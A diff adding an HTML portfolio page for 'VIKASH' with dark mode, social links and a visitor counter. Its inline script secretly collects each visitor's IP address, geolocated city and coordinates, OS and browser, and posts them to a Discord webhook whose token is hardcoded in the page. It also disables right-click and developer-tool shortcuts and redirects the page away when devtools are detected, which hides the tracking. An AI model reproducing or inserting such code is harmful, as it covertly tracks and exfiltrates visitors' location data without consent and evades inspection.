@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VIKASH</title>
+
+    <!-- Google fonts -->
+    <link href="https://fonts.googleapis.com/css?family=Montserrat:400,500,600,700%7COpen+Sans&display=swap" />
+
+    <!-- Libraries -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+    <!-- Custom styling -->
+    <link rel="stylesheet" href="./assets/css/util.css">
+    <link rel="stylesheet" href="./assets/css/animation.css">
+    <link rel="stylesheet" href="./assets/css/style.css">
+
+    <style>
+        .btn-contact {
+            background-color: green;
+            color: white;
+            border-radius: 30px;
+            padding: 12px 30px;
+            font-weight: 700;
+            cursor: pointer;
+            outline: none;
+        }
+
+        .btn-contact:hover {
+            background-color: mediumslateblue;
+        }
+
+        /* Example media query for smaller screens */
+        @media only screen and (max-width: 600px) {
+            .logo {
+                width: 100px;
+            }
+        }
+
+        /* Style for visitor count in the footer */
+        footer {
+            position: fixed;
+            left: 20px;
+            bottom: 20px;
+            font-size: 14px;
+            color: orangered;
+        }
+
+        /* Loading screen styles */
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: #fff;
+            z-index: 9999;
+        }
+
+        /* Dark mode styles */
+        body {
+            transition: background-color 0.3s, color 0.3s;
+        }
+
+        body.dark-mode {
+            background-color: #121212;
+            color: #ffffff;
+        }
+
+        body.dark-mode header {
+            background-color: #1f1f1f;
+            color: #ffffff;
+        }
+
+        body.dark-mode .content {
+            background-color: #1e1e1e;
+            color: #ffffff;
+        }
+
+        body.dark-mode a {
+            color: #bb86fc;
+        }
+
+        body.dark-mode .btn-contact {
+            background-color: #bb86fc;
+            color: #000;
+        }
+
+        /* Theme toggle styles */
+        .theme-toggle {
+            display: flex;
+            align-items: center;
+            margin-left: 15px;
+            cursor: pointer;
+            position: relative;
+        }
+
+        .theme-toggle i {
+            font-size: 24px;
+            color: #333;
+            transition: transform 0.3s ease;
+        }
+
+        body.dark-mode .theme-toggle i.fa-moon {
+            display: inline-block;
+            color: #bb86fc;
+        }
+
+        body.dark-mode .theme-toggle i.fa-sun {
+            display: none;
+        }
+
+        .theme-toggle i.fa-moon {
+            display: none;
+        }
+
+        .theme-toggle i.fa-sun {
+            display: inline-block;
+            color: #ffc107;
+        }
+
+        /* Header navigation adjustments */
+        header {
+            display: flex;
+            align-items: center;
+            transition: background-color 0.3s;
+        }
+
+        .header-actions {
+            display: flex;
+            align-items: center;
+            margin-left: auto;
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-screen" id="loadingScreen">
+        <iframe src="./assets/Loading form/index.html" frameborder="0" style="width: 100%; height: 100%;"></iframe>
+    </div>
+
+    <div class="wrapper" style="display: none;" id="mainContent">
+        <!-- Header -->
+        <header>
+            <img class="logo" src="./assets/img/logo.png" width="100" alt="VIKASH" />
+            <nav>
+                <ul>
+                    <li><a href="#">Home</a></li>
+                    <li><a href="./assets/About/index.html">About</a></li>
+                    <li><a href="projects">Projects</a></li>
+                </ul>
+            </nav>
+            <div class="header-actions">
+                <a class="btn-contact" href="./assets/Contact form/index.html">
+                    <i class="fa fa-envelope-o"></i> Contact Us
+                </a>
+                <div class="theme-toggle" id="themeToggle">
+                    <i class="fas fa-sun"></i>
+                    <i class="fas fa-moon"></i>
+                </div>
+            </div>
+        </header>
+        <!-- End Header -->
+
+        <!-- Main Content -->
+        <div class="content">
+            <div class="hero-info m-50" style="flex-basis: 640px;">
+                <h1>Connecting the dots in the <span class="locale">digital world</span></h1>
+                <p>Where innovation meets the web <a href="https://internet.org" target="_blank">Internet</a>,
+                    "Connecting you to the digital world. Crafting online experiences that captivate. Innovating the
+                    web, one click at a time."</p>
+                <a class="btn btn-outline" href="https://github.com/Vikash888" target="_blank"> <i
+                        class="fa-brands fa-github"></i> GitHub 
+                </a>
+                <div class="social-links">
+                    <ul>
+                        <li><a href="https://www.facebook.com/profile.php?id=100013994083962&mibextid=ZbWKwL"
+                                target="_blank" class="btn-social bg-facebook">
+                                <i class="fa-brands fa-facebook-f"></i>
+                            </a></li>
+                        <li><a href="https://youtube.com/@vikash.j3497" target="_blank"
+                                class="btn-social bg-youtube">
+                                <i class="fa-brands fa-youtube"></i>
+                            </a></li>
+                        <li><a href="https://www.instagram.com/crazy_v_i_c_k_y__?igsh=MXZzaGI5dXZ2ZDJzbg=="
+                                target="_blank" class="btn-social bg-instagram">
+                                <i class="fa-brands fa-instagram"></i>
+                            </a></li>
+                        <li><a href="http://www.linkedin.com/in/vikash-j-5b5056228" target="_blank"
+                                class="btn-social bg-linkedin">
+                                <i class="fa-brands fa-linkedin"></i>
+                            </a></li>
+                    </ul>
+                </div>
+            </div>
+            <img src="assets/img/WEB.png" alt="WEB.png">
+        </div>
+        <!-- End Main Content -->
+
+        <!-- Footer -->
+        <footer>
+            <p>Client IP: <span id="Clientip">Fetching...</span></p>
+            <p>Total Visitors: <span id="visitorCount">0</span></p>
+        </footer>
+        <!-- End Footer -->
+    </div>
+
+    <script>
+             document.addEventListener('DOMContentLoaded', function () {
+            setTimeout(function () {
+                document.getElementById('loadingScreen').style.display = 'none';
+                document.getElementById('mainContent').style.display = 'block';
+            }, 1000);
+
+            // Dark mode toggle functionality
+            const themeToggle = document.getElementById('themeToggle');
+            const body = document.body;
+
+            // Check for saved theme preference
+            const savedTheme = localStorage.getItem('theme');
+            if (savedTheme) {
+                body.classList.add(savedTheme);
+            }
+
+            themeToggle.addEventListener('click', function() {
+                body.classList.toggle('dark-mode');
+                
+                // Save theme preference
+                if (body.classList.contains('dark-mode')) {
+                    localStorage.setItem('theme', 'dark-mode');
+                } else {
+                    localStorage.removeItem('theme');
+                }
+            });
+        });
+        // Discord webhook URL placeholder
+const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1262504162751680582/6BqMbWkomK8CpKQl2HaHVDWS-cAFEJtmGDbjsiBvBSNk14boIbZbXGm-Px7sDzUdU0I2';
+        document.addEventListener('DOMContentLoaded', function () {
+            setTimeout(function () {
+                document.getElementById('loadingScreen').style.display = 'none';
+                document.getElementById('mainContent').style.display = 'block';
+            }, 1000);
+        });
+
+        async function getClientip() {
+            try {
+                let response = await fetch('https://api.ipify.org?format=json');
+                let data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('Error fetching IP address:', error);
+                return 'Unable to fetch IP';
+            }
+        }
+
+        async function getVisitorLocation(ip) {
+            try {
+                let response = await fetch(`https://ipinfo.io/${ip}/json`);
+                let data = await response.json();
+                console.log('Location data:', data);
+                return {
+                    country: data.country,
+                    city: data.city,
+                    latitude: data.loc.split(',')[0],
+                    longitude: data.loc.split(',')[1]
+                };
+            } catch (error) {
+                console.error('Error fetching location data:', error);
+                return { country: 'Unable to fetch location', city: '', latitude: '', longitude: '' };
+            }
+        }
+
+        function getVisitorOS() {
+            let os = 'Unknown OS';
+            if (navigator.appVersion.indexOf("Win") != -1) os = "Windows";
+            if (navigator.appVersion.indexOf("Mac") != -1) os = "MacOS";
+            if (navigator.appVersion.indexOf("X11") != -1) os = "UNIX";
+            if (navigator.appVersion.indexOf("Linux") != -1) os = "Linux";
+            return os;
+        }
+
+        function getVisitorBrowser() {
+            let userAgent = navigator.userAgent;
+            let browser = 'Unknown Browser';
+
+            if (userAgent.match(/firefox|fxios/i)) {
+                browser = 'Firefox';
+            } else if (userAgent.match(/samsungbrowser/i)) {
+                browser = 'Samsung Internet';
+            } else if (userAgent.match(/opr\//i) || userAgent.match(/opera|opr/i)) {
+                browser = 'Opera';
+            } else if (userAgent.match(/trident/i)) {
+                browser = 'Internet Explorer';
+            } else if (userAgent.match(/edg/i)) {
+                browser = 'Microsoft Edge';
+            } else if (userAgent.match(/chrome|crios/i)) {
+                browser = 'Chrome';
+            } else if (userAgent.match(/safari/i)) {
+                browser = 'Safari';
+            }
+
+            return browser;
+        }
+
+    async function sendToDiscord(ip, location, os, browser) {
+            const googleMapsUrl = `https://www.google.com/maps?q=${location.latitude},${location.longitude}`;
+            const message = {
+                content: `
+New visitor detected!
+IP Address: ${ip}
+Location: ${location.country}, ${location.city} (${location.latitude}, ${location.longitude})
+Google Maps: ${googleMapsUrl}
+Operating System: ${os}
+Browser: ${browser}
+                `
+            };
+
+            await fetch(DISCORD_WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(message)
+            });
+        }
+        function isVisitorCounted() {
+            let visited = document.cookie.includes('visited=true');
+            if (!visited) {
+                document.cookie = 'visited=true; max-age=86400';
+            }
+            return visited;
+        }
+
+        function getVisitorCount() {
+            let count = localStorage.getItem('visitorCount') || 0;
+            return parseInt(count);
+        }
+
+        function updateVisitorCount() {
+            if (!isVisitorCounted()) {
+                let count = getVisitorCount();
+                count++;
+                localStorage.setItem('visitorCount', count);
+                return count;
+            } else {
+                return getVisitorCount();
+            }
+        }
+
+        let visitorCount = updateVisitorCount();
+        document.getElementById('visitorCount').textContent = visitorCount;
+
+        getClientip().then(ip => {
+            document.getElementById('Clientip').textContent = ip;
+
+            getVisitorLocation(ip).then(location => {
+                sendToDiscord(ip, location, getVisitorOS(), getVisitorBrowser());
+            });
+        });
+
+        window.addEventListener('contextmenu', function (e) {
+            e.preventDefault();
+        });
+
+        window.addEventListener('keydown', function (e) {
+            if (e.key === 'F12') {
+                e.preventDefault();
+            }
+        });
+
+        window.addEventListener('keydown', function (e) {
+            if (e.ctrlKey && e.shiftKey && e.key === 'I') {
+                e.preventDefault();
+            }
+        });
+
+        function detectDevTools() {
+            let startTime = performance.now();
+            debugger;
+            let endTime = performance.now();
+
+            if (endTime - startTime > 1) {
+                alert('Developer tools detected! Please close them to continue.');
+                window.location.href = 'about:blank';
+            }
+        }
+
+        detectDevTools();
+    </script>
+</body>
+
+</html>
